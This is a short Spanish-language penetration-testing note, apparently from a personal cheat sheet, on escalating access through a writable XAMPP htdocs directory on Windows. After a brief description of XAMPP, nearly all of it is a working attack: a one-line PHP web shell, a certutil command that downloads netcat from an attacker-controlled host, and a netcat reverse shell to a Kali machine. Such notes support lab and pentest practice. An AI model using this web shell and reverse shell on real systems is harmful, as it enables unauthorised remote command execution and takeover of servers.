# Xampp

Tags: #PrivEsc #Xampp #Windows #PHP #ReverseShell 

**XAMPP** es un paquete que reúne varias herramientas para montar un **servidor web local** de forma sencilla. El nombre viene de:

- **X** → cualquier sistema operativo (originalmente se usaba para indicar “cross-platform”)
- **A** → Apache
- **M** → MariaDB/MySQL
- **P** → PHP
- **P** → Perl

## Explotación 

Si este directorio tiene permsos de escritura: 

	C:\xampp\htdocs -->  Es el DocumentRoot de Apache

```bash 
# Verificar la creación de archivos en ese dir 
❯ echo 'Hola' > test.txt   

NOTA:
	- Se puede subir un php con un cmd para ejecutar comandos desde la web
```

```php 
# Archivo PHP malicioso a subir 
❯ nvim cmd.php

	<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>
```

```bash 
# Al subir el archivo este se encuentra en la raíz de la web 
	 http://IP/cmd.php?cmd=whoami 
```

```bash 
# Subir Netcat desde la web 
	http://IP/cmd.php?cmd=certutil -urlcache -f http://<IP>/nc.exe C:\Temp\nc.exe

# Ejecutar una revershell desde la web 
	http://IP/cmd.php?cmd=C:\Temp\nc.exe <IP_KALI> <PUERTO> -e cmd.exe
```